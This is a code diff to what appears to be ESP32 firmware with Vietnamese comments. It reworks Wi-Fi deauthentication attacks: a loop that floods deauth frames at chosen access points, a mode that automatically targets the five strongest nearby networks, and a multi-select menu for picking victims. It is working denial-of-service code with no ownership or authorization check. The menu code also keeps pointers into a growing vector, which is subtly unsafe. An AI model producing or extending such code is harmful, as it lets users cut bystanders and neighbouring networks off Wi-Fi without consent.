@@ -271,140 +271,113 @@ bool wifi_atk_unsetWifi() {
 ** @brief: Open menu to choose which AP Attack
 ***************************************************************************************/
 // --- ĐỘNG CƠ MULTI-DEAUTH ---
+
+
+// --- TÍNH NĂNG 1: DEAUTH TOP 5 RSSI ---
+
+
+// --- TÍNH NĂNG 2: MENU MULTI-SELECT ---
+std::vector<wifi_ap_record_t> ap_records;
+std::vector<bool> multi_select_flags;
+std::vector<String> menu_strings;
+// --- TÍNH NĂNG 2: MENU MULTI-SELECT (BẢN CHUẨN KHÔNG LỖI RAM) ---
+// --- HÀM TẤN CÔNG (Học logic Hopping từ Ultimate) ---
 void execute_multi_deauth(const std::vector<wifi_ap_record_t>& targets) {
     if (targets.empty()) return;
     resetGlobalState();
-    cleanlyStopWebUiForWiFiFeature();
     if (!wifi_atk_setWifi()) return;
 
-    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    uint32_t lastTime = millis();
-    uint16_t count = 0;
-
-    drawMainBorderWithTitle("Multi-Deauth Attack");
-    tft.setCursor(10, 40);
-    tft.println("Attacking " + String(targets.size()) + " Targets");
-
+    drawMainBorderWithTitle("Multi-Deauth");
     while (true) {
-        for (const auto &record : targets) {
-            wsl_bypasser_send_raw_frame(&record, record.primary, _default_target);
-            // Bắn một loạt 50 gói cho mỗi mục tiêu rồi xoay vòng
-            for (int i = 0; i < 50; i++) {
-                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-                count += 3;
-                if (EscPress) break;
+        for (const auto &target : targets) {
+            // SỬA LỖI: Thêm _default_target để đủ 3 tham số
+            wsl_bypasser_send_raw_frame(&target, target.primary, _default_target); 
+            
+            for (int i = 0; i < 40; i++) {
+                send_raw_frame(deauth_frame, 26);
+                if (check(EscPress)) break;
             }
-            if (EscPress) break;
+            if (check(EscPress)) break;
         }
-        
-        // Cập nhật màn hình mỗi 2 giây
-        if (millis() - lastTime > 2000) {
-            drawMainBorderWithTitle("Multi-Deauth Attack");
-            tft.setCursor(10, 40);
-            tft.println("Targets: " + String(targets.size()));
-            tft.setCursor(10, tftHeight - 25);
-            tft.println("Frames: " + String(count / 2) + "/s   ");
-            count = 0;
-            lastTime = millis();
-        }
-
         if (check(EscPress)) break;
     }
     wifi_atk_unsetWifi();
     returnToMenu = true;
 }
 
-// --- TÍNH NĂNG 1: DEAUTH TOP 5 RSSI ---
+// --- TÍNH NĂNG 1: TOP 5 RSSI ---
 void deauthTop5Attack() {
     displayTextLine("Scanning..");
     int nets = WiFi.scanNetworks(false, showHiddenNetworks);
-    std::vector<wifi_ap_record_t> temp_records;
-    
+    std::vector<wifi_ap_record_t> temp_list;
     for (int i = 0; i < nets; i++) {
-        wifi_ap_record_t record;
-        memset(&record, 0, sizeof(record));
-        memcpy(record.bssid, WiFi.BSSID(i), 6);
-        record.primary = static_cast<uint8_t>(WiFi.channel(i));
-        record.rssi = WiFi.RSSI(i); // Lấy RSSI
-        if (strlen(WiFi.SSID(i).c_str()) > 0) {
-            strncpy((char *)record.ssid, WiFi.SSID(i).c_str(), sizeof(record.ssid) - 1);
-        }
-        temp_records.push_back(record);
+        wifi_ap_record_t r;
+        memset(&r, 0, sizeof(r));
+        memcpy(r.bssid, WiFi.BSSID(i), 6);
+        r.primary = static_cast<uint8_t>(WiFi.channel(i));
+        r.rssi = WiFi.RSSI(i);
+        temp_list.push_back(r);
     }
-
-    // Sắp xếp theo RSSI giảm dần (Mạnh nhất đứng đầu)
-    std::sort(temp_records.begin(), temp_records.end(), [](const wifi_ap_record_t& a, const wifi_ap_record_t& b) {
+    // Sắp xếp sóng khỏe đứng đầu (Học từ BW21)
+    std::sort(temp_list.begin(), temp_list.end(), [](const wifi_ap_record_t& a, const wifi_ap_record_t& b) {
         return a.rssi > b.rssi;
     });
-
-    std::vector<wifi_ap_record_t> top5_targets;
-    for(size_t i = 0; i < std::min((size_t)5, temp_records.size()); i++) {
-        top5_targets.push_back(temp_records[i]);
-    }
-
-    execute_multi_deauth(top5_targets);
+    
+    std::vector<wifi_ap_record_t> top5;
+    for (int i = 0; i < std::min((int)temp_list.size(), 5); i++) top5.push_back(temp_list[i]);
+    execute_multi_deauth(top5);
 }
 
-// --- TÍNH NĂNG 2: MENU MULTI-SELECT ---
-std::vector<bool> multi_select_flags;
-std::vector<String> menu_strings;
+// --- TÍNH NĂNG 2: MULTI-SELECT (Đã sửa lỗi RAM & Effect [X]) ---
+// --- TÍNH NĂNG 2: MENU MULTI-SELECT (BẢN CHUẨN - CHỐNG TRÀN RAM) ---
 void multi_select_menu() {
     displayTextLine("Scanning..");
     int nets = WiFi.scanNetworks(false, showHiddenNetworks);
-    ap_records.clear();
-    multi_select_flags.clear();
-    menu_strings.clear();
     
+    // BƯỚC 1: Quét và nạp dữ liệu vào ap_records MỘT LẦN DUY NHẤT (Để ngoài while)
+    ap_records.clear();
+    multi_select_flags.assign(nets, false);
     for (int i = 0; i < nets; i++) {
-        wifi_ap_record_t record;
-        memset(&record, 0, sizeof(record));
-        memcpy(record.bssid, WiFi.BSSID(i), 6);
-        record.primary = static_cast<uint8_t>(WiFi.channel(i));
-        if (strlen(WiFi.SSID(i).c_str()) > 0) {
-            strncpy((char *)record.ssid, WiFi.SSID(i).c_str(), sizeof(record.ssid) - 1);
-        }
-        ap_records.push_back(record);
-        multi_select_flags.push_back(false);
+        wifi_ap_record_t r;
+        memset(&r, 0, sizeof(r));
+        memcpy(r.bssid, WiFi.BSSID(i), 6);
+        r.primary = WiFi.channel(i);
+        // Lưu tên SSID để dùng khi tấn công
+        strncpy((char *)r.ssid, WiFi.SSID(i).c_str(), sizeof(r.ssid) - 1);
+        ap_records.push_back(r);
     }
 
-    bool stayInMenu = true;
-    while(stayInMenu) {
+    // BƯỚC 2: Vòng lặp vẽ giao diện (Redraw loop)
+    while(true) {
         options.clear();
-        menu_strings.clear(); // Xóa cũ làm mới
+        menu_strings.clear(); 
         
-        // 1. Dòng kích hoạt
-        options.push_back({"[ START ATTACK ]", [&]() {
-            std::vector<wifi_ap_record_t> selected_targets;
-            for(size_t i = 0; i < ap_records.size(); i++) {
-                if(multi_select_flags[i]) selected_targets.push_back(ap_records[i]);
+        // Nút Kích hoạt
+        options.push_back({">> START ATTACK <<", [&]() {
+            std::vector<wifi_ap_record_t> selected;
+            for(int i = 0; i < ap_records.size(); i++) {
+                if(multi_select_flags[i]) selected.push_back(ap_records[i]);
             }
-            if(!selected_targets.empty()) execute_multi_deauth(selected_targets);
-            stayInMenu = false;
+            if(!selected.empty()) execute_multi_deauth(selected);
         }});
 
-        // 2. Danh sách WiFi
-        for(size_t i = 0; i < ap_records.size(); i++) {
-            String prefix = multi_select_flags[i] ? "[X] " : "[ ] ";
-            String ssid_str = String((char*)ap_records[i].ssid);
-            if(ssid_str.length() == 0) ssid_str = "Hidden";
+        // Vẽ danh sách WiFi với dấu [X]
+        for (int i = 0; i < nets; i++) {
+            String status = multi_select_flags[i] ? "[X] " : "[ ] ";
+            String ssid_name = WiFi.SSID(i);
+            if(ssid_name.length() == 0) ssid_name = "<Hidden>";
             
-            // LƯU Ý: Phải đẩy vào vector menu_strings để giữ pointer không bị lỗi
-            menu_strings.push_back(prefix + ssid_str); 
+            menu_strings.push_back(status + ssid_name); 
             
             options.push_back({menu_strings.back().c_str(), [&, i]() {
                 multi_select_flags[i] = !multi_select_flags[i];
-                returnToMenu = true;
-                // Ép menu load lại để hiện dấu [X]
+                returnToMenu = true; // HIỆU ỨNG: Ép vẽ lại để hiện dấu [X] ngay
             }});
         }
 
         addOptionToMainMenu();
-        loopOptions(options); 
-        
-        if (check(EscPress) || !stayInMenu) {
-            stayInMenu = false;
-            returnToMenu = true;
-        }
+        loopOptions(options);
+        if (check(EscPress)) break;
     }
 }
 
